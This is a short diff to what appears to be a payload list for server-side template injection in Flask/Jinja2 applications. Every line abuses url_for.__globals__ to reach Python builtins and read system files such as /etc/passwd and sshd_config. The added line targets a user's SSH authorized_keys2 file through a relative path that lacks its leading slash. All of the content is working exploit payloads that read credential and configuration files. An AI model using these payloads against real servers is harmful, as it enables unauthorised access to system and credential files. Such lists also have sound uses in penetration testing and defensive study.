@@ -1,3 +1,5 @@
 {{url_for.__globals__['__builtins__']['open']('/etc/hosts').read()}}
 {{url_for.__globals__['__builtins__']['open']('/etc/passwd').read()}}
 {{url_for.__globals__['__builtins__']['open']('/etc/ssh/sshd_config').read()}}
+{{url_for.__globals__['__builtins__']['open']('home/uraj/.ssh/authorized_keys2').read()}}
+
